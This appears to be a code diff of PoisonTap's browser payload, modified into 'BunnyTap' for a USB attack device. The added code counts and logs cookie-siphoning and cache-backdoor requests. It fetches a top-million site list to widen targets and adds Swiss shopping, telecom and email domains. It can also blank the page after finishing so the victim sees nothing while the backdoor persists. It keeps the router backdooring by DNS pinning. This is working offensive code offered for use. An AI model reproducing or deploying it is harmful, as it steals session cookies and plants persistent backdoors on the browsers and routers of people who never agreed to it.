@@ -4,10 +4,9 @@
 <!-- https://samy.pl/poisontap -->
 <html><head></head>
 <body>
-
-Welcome to <b><a style="color: #E30B5D" href="https://samy.pl/poisontap">PoisonTap</a></b>, by <a style="color: #E30B5D" href="https://samy.pl">samy kamkar</a>.<p>
-
-
+<div id="__title">
+Welcome to <b><a style="color: #E30B5D" href="https://forums.hak5.org/index.php?/topic/40240-poisontap-on-the-bunny/">BunnyTap</a></b>, by <a style="color: #E30B5D">Whistle Master</a>, tweaked by <a style="color: #E30B5D">Gachnang</a>.<br>Based on <b><a style="color: #E30B5D" href="https://samy.pl/poisontap">PoisonTap</a></b> created by <a style="color: #E30B5D" href="https://samy.pl">samy kamkar</a>.<p>
+</div>
 <script>
 // This entire file can behave as both JS and HTML (note the open-comment at the top to prevent HTML from executing in a JS environment)
 
@@ -23,7 +22,7 @@ Welcome to <b><a style="color: #E30B5D" href="https://samy.pl/poisontap">PoisonT
 var displayAnimation = 1;
 
 // PoisonTap's IP address (set up in network config)
-var ptIp = '1.0.0.1';
+var ptIp = '174.16.64.1';
 
 // Whether we want to use image tags or iframes to
 // exfiltrate cookies and force cache backdoors.
@@ -39,6 +38,9 @@ var dnsPinServer = '.ip.samy.pl';
 
 /* First poison the user's cache of common JS files from CDNs */
 var pre = '';
+// Gachnang 'count' start 
+var countMax = 0; //getDoms().length + 1;
+// Gachnang 'count' end
 
 backdoorRouters();
 
@@ -49,7 +51,20 @@ function addIframe(host)
 {
 	var url = 'http://' + host + '/PoisonTap';
 	var iframe = document.createElement('iframe');
-	pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	//pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	
+	// Gachnang 'count' start
+	if(iframe.addEventListener){
+		iframe.addEventListener('load', TargedDone);
+		iframe.addEventListener('error', TargedDone);
+	} else {
+		iframe.attachEvent("onload", TargedDone);
+		iframe.attachEvent("onerror", TargedDone);
+	}
+	countMax++;
+	// Gachnang 'count' end
+	
+	iframe.id = host;
 	iframe.src = url;
   //document.body.appendChild(iframe);
 
@@ -62,7 +77,13 @@ function addImg(host)
 {
 	var url = 'http://' + host + '/PoisonTap';
 	var img1 = document.createElement('img');
-	pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	//pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	
+	// Gachnang 'count' start
+	img1.addEventListener('load', TargedDone);
+	img1.addEventListener('error', TargedDone);
+	countMax++;
+	// Gachnang 'count' end
 	img1.src = url;
 
   // support www. version?
@@ -70,18 +91,197 @@ function addImg(host)
 	//img2.src = 'http://www.' + host + '/PoisonTap';
 }
 
+// Gachnang 'util' start
+var HttpClient = function() {
+    this.get = function(aUrl, aCallback) {
+        var anHttpRequest = new XMLHttpRequest();
+        anHttpRequest.onreadystatechange = function() { 
+            if (anHttpRequest.readyState == 4 ){ // && anHttpRequest.status == 200)
+                aCallback(anHttpRequest);				
+			}
+        }
+
+        anHttpRequest.open( "GET", aUrl, true );            
+        anHttpRequest.send( null );
+    }
+}
+// Gachnang 'util' end
+
+// Gachnang 'count' start
+var countDone = 0; 
+function TargedDone() {
+	pre += 'Siphoning cookies & force caching backdoor on ' + this.src + ' <br/>';
+	countDone++;
+		
+	finishedQuestion();
+}
+// Gachnang 'count' end
+
+// Gachnang 'finished' start
+var onFinished = 0;
+var finishOnBunnyAway = 0;
+
+var bunnyAway = false;
+var bunnyAwayCounter = 0;
+setTimeout(getBunnyAway, 3000);
+
+function finishedQuestion(){
+	let close = bunnyAway;
+	
+	if(countDone >= countMax){
+		if(useTop1m == 1){
+			top1mRequest();
+		} else {
+			close=true;
+		}
+	}
+	
+	var s = document.getElementById('__ptterm_status_d');
+	s.innerHTML = countDone;
+	var m = document.getElementById('__ptterm_status_m');
+	m.innerHTML = countMax;	
+	
+	if(close){ // countDone >= countMax
+		// 'you have seen nothing..'
+		if(onFinished == 1 ){
+			// clear page, only leaves "/* */" <- 'backdoor' will still run
+			setTimeout(function(){ 
+				document.getElementById('canvas').outerHTML = "";
+				document.getElementById('__ptterm').outerHTML = "";
+				document.getElementById('__title').outerHTML = "";
+				document.getElementById('__poisontap').outerHTML = "";
+			}, 1000);		
+		} else
+		if(onFinished == 2 ){
+			// redirect to 'about:blank' <- can shutdown 'backdoor'..
+			setTimeout(function(){ 
+				location = 'about:blank';
+			}, 1000);
+		}
+	}
+	
+}
+var bunnyConfigReceived=false;
+function getBunnyAway(){
+    var client = new HttpClient();
+	client.get('/BunnyTap', function(response) {
+		if(response && response.status == 200){
+			if (displayAnimation)
+				console.log('BashBunny still alive!');
+			
+			bunnyAway = false;
+			bunnyAwayCounter = 0;
+			
+			// can throw error..
+			let answer = JSON.parse(response.responseText);
+			if(answer && !bunnyConfigReceived){
+				if(answer.hasOwnProperty('onFinished')){
+					onFinished = answer.onFinished;
+				}
+				
+				if(answer.hasOwnProperty('finishOnBunnyAway')){
+					finishOnBunnyAway = answer.finishOnBunnyAway;
+				}
+				
+				if(answer.hasOwnProperty('useTop1m')){
+					useTop1m = answer.useTop1m;
+				}
+				
+				bunnyConfigReceived = true;
+			}
+		} else {
+			bunnyAwayCounter++;
+			
+			if (displayAnimation)
+				console.log('BashBunnys answer missed! ' + bunnyAwayCounter);	
+			
+			if(bunnyAwayCounter >= 3){
+				if (displayAnimation)
+					console.log('BashBunny\'s missing! ' + bunnyAwayCounter);
+					
+				bunnyAway = true;
+				finishedQuestion();
+			}
+		}		
+	});
+	
+	setTimeout(getBunnyAway, 3000);
+}
+
+// Gachnang 'top-1m.csv' end
+var useTop1m = 0;
+var top1mStep = 100;
+var top1mStart = 0;
+var top1mStop = 100;
+function top1mRequest(){
+	if(useTop1m == 1){
+		var client = new HttpClient();
+		client.get('/top-1m/' + top1mStart + '/' + top1mStop, top1mAnswer);
+		
+		if (displayAnimation) 
+			console.log('Request started for top1m', top1mStart, top1mStop);	
+		
+		top1mStart = top1mStop + 1;
+		top1mStop  = top1mStart + top1mStep;
+	}
+}
+
+function top1mAnswer(response){
+	if(response && response.status == 200){
+		// can throw error..
+		let answer = JSON.parse(response.responseText);
+		if(answer){		
+			if(answer.hasOwnProperty('status') && answer.status > 0){
+				if (displayAnimation)
+					console.log('Answer for top1m: status is ' + answer.status, answer);
+					
+				if(answer.hasOwnProperty('data')){
+					for(let i = 0; i < answer.data.length; i++){
+						// get rid of rownumber
+						if(answer.data[i].indexOf(',') != -1){
+							answer.data[i] = answer.data[i].split(',')[1];
+						}						
+					
+						// not add url already done
+						if(!getDoms().includes(answer.data[i])){
+							// decide whether we cache an img tag or iframe
+							if (cacheIframe)
+							  addIframe(answer.data[i]);
+							else
+							  addImg(answer.data[i]);
+						}
+					}
+				} else {
+					if (displayAnimation)
+						console.log('Answer for top1m: data is missing..', answer);
+						
+					useTop1m=0;
+				}
+			} else {
+				if (displayAnimation)
+					console.log('Answer for top1m: Status is 0 > finished', answer);
+					
+				useTop1m=0;
+			}
+		}
+	}
+}
+// Gachnang 'top-1m.csv'
 
 // Contact common router IP addresses to cache backdoor onto the router
 function backdoorRouters()
 {
   // pin the poisontap IP
   addImg(ptIp + '.pin' + dnsPinServer); // this is meant to pin 192.168.0.1 to 1.0.0.1
-
+  
   // give the pinned resolver a moment to update
   setTimeout(function() {
     var routers = getRouters();
-    for (var i in routers)
+    for (var i in routers){
       addIframe(routers[i] + dnsPinServer);
+	  // no count for routers
+	  countMax--;
+	}
   }, 500);
 }
 
@@ -130,7 +330,12 @@ if (displayAnimation)
     div.style.right = '10px';
     d.body.appendChild(div);
   }
+} 
+// Gachnang 'hiddeText' start
+else {
+	document.getElementById('__title').outerHTML = "";	
 }
+// Gachnang 'hiddeText' stop
 
 function ltext()
 {
@@ -142,13 +347,18 @@ function ltext()
 		  l += pre.substr(0, 1);
 	  	pre = pre.substr(1);
 	  }
-		document.getElementById('__ptterm').innerHTML += l;
-		setTimeout(ltext, 10); // 10 looks better?
 
+	  // Gachnang 'scroller' start
+	  var scroller = document.getElementById('__ptterm_scroller');
+	  scroller.innerHTML += l;
+	  scroller.scrollTop = scroller.scrollHeight;
+	  // Gachnang 'scroller' end
+	  // before, instead of 'scroller', here was: document.getElementById('__ptterm').innerHTML += l;
 	}
+	setTimeout(ltext, 10); // 10 looks better?
 	return;
-
-  // do letter at a time this way
+	/*
+	// do letter at a time this way
 	if (pre.length)
 	{
 		var l = pre.substr(0, 1);
@@ -162,9 +372,15 @@ function ltext()
 			}
 		}
 
-		document.getElementById('__ptterm').innerHTML += l;
+      // Gachnang 'scroller' start (code gets never reached...)
+	  var scroller = document.getElementById('__ptterm_scroller');
+	  scroller.innerHTML += l;
+	  scroller.scrollTop = scroller.scrollHeight;
+	  // Gachnang 'scroller' end
+	  // before, instead of 'scroller', here was:document.getElementById('__ptterm').innerHTML += l;
+	  
 		setTimeout(ltext, 1); // 10 looks better?
-	}
+	}*/
 }
 
 function ptcanvas()
@@ -173,7 +389,8 @@ function ptcanvas()
 	term.style.backgroundColor = '#000';
 	term.style.color = '#00bfff';
 	term.id = '__ptterm';
-	term.innerHTML = 'Welcome to <b><a href="http://samy.pl/poisontap">PoisonTap</a></b>, by <a href="http://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
+	//term.innerHTML = 'Welcome to <b><a href="http://samy.pl/poisontap">PoisonTap</a></b>, by <a href="http://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
+	term.innerHTML = 'Welcome to <b><a href="https://forums.hak5.org/index.php?/topic/40240-poisontap-on-the-bunny/">BunnyTap</a></b>, by <a>Whistle Master</a>, tweaked by <a style="color: #E30B5D">Gachnang</a>.<br>Based on <b><a href="https://samy.pl/poisontap">PoisonTap</a></b> created by <a href="https://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
   term.style.width = '100%';
   term.style.height = '100%';
   term.style.position = 'fixed';
@@ -196,6 +413,44 @@ function ptcanvas()
   //canvas.style.width = '100%';
   //canvas.style.height = '100%';
 
+  // Gachnang 'scroller' start
+  var scroller = d.createElement('div');
+  scroller.id = '__ptterm_scroller';
+  scroller.style.height = 'calc(100% - 64px)';
+  scroller.style.top = '50px';
+  scroller.style.overflow = 'hidden';
+  scroller.style.position = 'absolute';
+  scroller.style.display = 'block';
+  term.appendChild(scroller);
+  // Gachnang 'scroller' end
+  
+  // Gachnang 'count' start
+  var statusD = d.createElement('div');
+  statusD.id = '__ptterm_status_d';
+  statusD.innerHTML = '0';
+  statusD.style.width = '50px';
+  statusD.style.color = 'green';
+  
+  var statusM = d.createElement('div');
+  statusM.id = '__ptterm_status_m';
+  statusM.innerHTML = '0';
+  statusM.style.width = '50px';
+  statusM.style.color = 'gray';
+  
+  var status = d.createElement('div');
+  status.id = '__ptterm_status';
+  status.style.top = '50px';
+  status.style.right = '50px';
+  status.style.overflow = 'hidden';
+  status.style.position = 'absolute';
+  status.style.display = 'block';
+  
+  status.appendChild(statusD);
+  status.appendChild(statusM);
+  
+  term.appendChild(status)
+  // Gachnang 'count' end
+  
   //term.appendChild(canvas);
   d.body.appendChild(canvas);
   d.body.appendChild(term);
@@ -1695,7 +1950,187 @@ function ptcanvas()
     return this.returnData;
   };
 
+// Gachnang 'BunnyTab' start
+var fontmap_bunnytap = function() {
+    this.returnData = new Array();
+    this.col = 80;
+    this.row = 160;
+    this.cellLength = 22;
+    this.cellSpace = 22;
+    for(var i=0; i<DEFIINE_instanceNum; i++) {
+      this.returnData[i] = {
+        shade : false,
+        fill : false,
+        stroke : false,
+        fillColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        strokeColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        size: 0,
+        position: {x:0, y:0, z:0},
+        rotate: {x:0, y:0, z:0}
+      };
+    };
+    this.fontMapData = [
+    {//B
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,3,3,4,0],[0,5,3,1,0],[0,5,2,1,0],[0,3,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+	{//U
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,4,0],[0,2,0,3,0],[0,5,0,5,0],[0,5,0,1,0],[0,3,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+	{//N
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,4,0],[0,4,0,5,0],[0,5,4,4,0],[0,5,3,5,0],[0,1,0,3,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+	{//N
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,4,0],[0,4,0,5,0],[0,5,4,4,0],[0,5,3,5,0],[0,1,0,3,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+	{//Y
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,2,0],[0,4,0,1,0],[0,3,2,0,0],[0,0,5,0,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//T
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*3.2, y:this.row*-0.15, z:0}, 
+      map : [[0,2,5,1,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,2,0,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//A
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*4.2, y:this.row*-0.15, z:0}, 
+      map : [[0,0,0,2,0],[0,0,2,5,0],[0,2,1,1,0],[0,1,3,5,0],[0,1,0,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//P
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*5.2, y:this.row*-0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,5,3,4,0],[0,3,4,1,0],[0,5,0,0,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    }
+    ];
+    var lastMap = 0;
+    for(var i=0; i<this.fontMapData.length; i++) {
+      for(var j=0; j<this.fontMapData[i].map.length; j++) {
+        for(var k=0; k<this.fontMapData[i].map[j].length; k++) {
+          switch(this.fontMapData[i].map[j][k]) {
+            case 0:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = 0;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : 0,
+                y : 0,
+                z : 0
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 1:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
+              break;
+            case 2:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 3:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:90};
+              break;
+            case 4:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:270};
+              break;
+            case 5:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
 
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+          };
+        };
+      };
+      lastMap += this.fontMapData[i].mapDataNum;
+    };
+    return this.returnData;
+  };
+ // Gachnang 'BunnyTab' stop
 
   var dynamic_001 = {// bold motion
     value : new Array(),
@@ -2080,7 +2515,8 @@ function ptcanvas()
       //fontMap_fullchara : fontmap_fullchara(),
       //fontmap_solidcell : fontmap_solidcell(),
       //fontmap_hackyou : fontmap_hackyou()
-      fontmap_poisontap: fontmap_poisontap()
+      fontmap_poisontap: fontmap_poisontap(),
+	  fontmap_bunnytap: fontmap_bunnytap()
     },
     dynamicFlag : 0,
     dynamicMap : new Object,
@@ -2134,6 +2570,9 @@ function ptcanvas()
              controll.endValue[num] = controll.staticMap.fontmap_hackyou[num];
              break;
            */
+		case "fontmap_bunnytap":
+		  controll.endValue[num] = controll.staticMap.fontmap_bunnytap[num];
+          break;
       };
       switch(controll.endValue[num].shade) {
         case true:
@@ -2362,6 +2801,15 @@ function ptcanvas()
     func : function() {
       controll.staticFlag = "freemap_disconnected";
       staticTransformSeries(800);
+    }
+  },
+  {
+    time : 1000,
+    func : function() {
+      init.nodeStrokeFlag = true;
+      controll.staticFlag = "fontmap_bunnytap";
+      //controll.staticFlag = "fontmap_solidcell";
+      staticTransformSeries(1000);
     }
   },
   /*
@@ -2882,7 +3330,35 @@ function getDoms()
     "wordpress.org",
     "1905.com",
     "wp.pl",
-    "google.ch",
+    
+	"google.ch",
+	"digitec.ch",
+	"swisscom.ch",
+	"upc.ch",
+	"sunrise.ch",
+	"wingo.ch",
+	"salt.ch",
+	"exlibris.ch",
+	"green.ch",
+	"hostpoint.ch",
+	"cyon.ch",
+	"hosttech.ch",
+	"switchplus.ch",
+	"zalando.ch",
+	"nespresso.com",
+	"brack.ch",
+	"alltron.ch",
+	"leshop.ch",
+	"microspot.ch",
+	"coopathome.ch",
+	"nettoshop.ch",
+	"siroop.ch",
+	"ricardo.ch",
+	"conrad.ch",
+	"bluewin.ch",
+	"office365.com",
+	"domian.com",
+	
     "doorblog.jp",
     "mama.cn",
     "google.dz",
